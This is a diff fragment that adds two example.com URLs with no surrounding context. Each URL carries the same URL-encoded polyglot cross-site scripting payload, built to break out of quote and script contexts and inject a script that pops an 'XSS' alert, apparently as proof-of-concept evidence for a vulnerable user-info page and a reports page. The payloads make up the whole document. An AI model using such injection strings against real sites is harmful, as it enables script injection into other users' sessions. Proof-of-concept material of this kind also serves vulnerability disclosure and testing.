@@ -1,0 +1,3 @@
+http://www.example.com/user/user/userinfo/id/2%27;alert%28String.fromCharCode%2888,83,83%29%29//%5C%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//%5C%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+
+http://www.example.com/user/reports/%27;alert%28String.fromCharCode%2888,83,83%29%29//%5C%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//%5C%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
